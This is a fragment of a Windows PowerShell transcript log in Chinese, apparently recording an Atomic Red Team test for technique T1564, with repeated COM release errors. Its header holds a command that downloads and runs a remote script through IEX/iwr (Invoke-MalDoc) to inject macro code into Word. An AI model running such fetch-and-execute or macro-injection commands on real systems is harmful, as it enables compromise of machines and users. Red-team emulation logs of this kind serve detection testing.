++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : NullReferenceException
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415170152
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
+$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap}
+进程 ID: 3568
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。””
+使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。”
+所在位置 行:96 字符: 5
++     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($app)  ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : NullReferenceException
+使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。”
+所在位置 行:96 字符: 5
++     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($app)  ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : NullReferenceException
+使用“1”个参数调用“ReleaseComObject”时发生异常:“未将对象引用设置到对象的实例。”
+所在位置 行:96 字符: 5
++     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($app)  ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : NullReferenceException
+
+PS>$global:?
+True
+**********************
+Windows PowerShell 脚本结束
+结束时间: 20230415170152
+**********************
